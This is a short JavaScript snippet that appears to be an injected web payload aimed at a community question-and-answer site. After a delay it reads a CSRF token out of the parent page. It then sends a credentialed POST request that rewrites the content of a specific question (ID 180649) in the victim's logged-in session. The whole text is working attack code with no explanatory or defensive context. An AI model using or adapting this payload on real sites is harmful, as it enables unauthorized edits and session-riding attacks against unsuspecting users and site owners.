setTimeout(function(){
  var t=window.parent.document.querySelector('input#csrftoken').value;
  fetch('/community/api/questions/180649/editContent',{method:'POST',credentials:'include',headers:{'X-Requested-With':'XMLHttpRequest','X-CSRF-TOKEN':t,'Content-Type':'application/json'},body:'{"content":"<p>such a nice community to help with doubt</p>"}'})
},2000)
